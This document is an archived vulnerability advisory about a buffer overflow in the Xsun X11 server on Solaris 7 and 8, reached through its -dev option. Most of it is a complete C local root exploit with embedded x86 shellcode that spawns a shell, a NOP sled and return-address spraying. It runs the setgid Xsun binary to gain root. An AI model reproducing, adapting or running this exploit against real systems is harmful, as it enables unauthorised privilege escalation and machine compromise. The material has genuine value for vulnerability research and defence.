source: http://www.securityfocus.com/bid/1140/info

A buffer overrun vulnerability exists in the Xsun X11 server, as shipped as part of Solaris 7 and 8 from Sun Microsystems. By supplying a long argument to the -dev option (normally used to set the output device), it is possible to execute arbitrary code with setgid root permissions. This can be further leveraged to gain root privileges, resulting in machine compromise.

/*
*
* Solaris 7  Xsun(suid) local overflow - PRIVATE for now!
* Solaris 2.7/(2.6?) x86 sploit no sparc code, yet!
*
* Discovered/sploited By DiGiT - teddi@linux.is
*
* Greets: #!ADM, #!security.is
*/

#include <stdio.h>
#include <stdlib.h>

// Generic solaris x86 shellcode by cheeze wizz

char shellcode[] =
 "\xeb\x48\x9a\xff\xff\xff\xff\x07\xff\xc3\x5e\x31\xc0\x89\x46\xb4"
 "\x88\x46\xb9\x88\x46\x07\x89\x46\x0c\x31\xc0\x50\xb0\x8d\xe8\xdf"
 "\xff\xff\xff\x83\xc4\x04\x31\xc0\x50\xb0\x17\xe8\xd2\xff\xff\xff"
 "\x83\xc4\x04\x31\xc0\x50\x8d\x5e\x08\x53\x8d\x1e\x89\x5e\x08\x53"
 "\xb0\x3b\xe8\xbb\xff\xff\xff\x83\xc4\x0c\xe8\xbb\xff\xff\xff\x2f"
 "\x62\x69\x6e\x2f\x73\x68\xff\xff\xff\xff\xff\xff\xff\xff\xff";
 
long get_esp() { __asm__("movl %esp,%eax"); }

int main(int argc, char *argv[]) {

  char buff[5000];
  int nopcount=2001, bsize=4000, offset=1850;
  int i;

  if (argc > 1) nopcount  = atoi(argv[1]);
  if (argc > 2) bsize  = atoi(argv[2]);
  if (argc > 3) offset = atoi(argv[3]);
        memset (buff, 0x90, bsize); 

                for (i = nopcount; i < bsize - 4; i += 4)
                *(long *) &buff[i] = get_esp() + offset;
 
        memcpy (buff + (nopcount - strlen (shellcode)), shellcode, strlen
        (shellcode));
 
            memcpy (buff, ":", 1);
 
         printf("Oh boy. DiGiT presents r00t\n");

         execl("/usr/openwin/bin/Xsun", "Xsun", "-dev", buff, NULL);

} 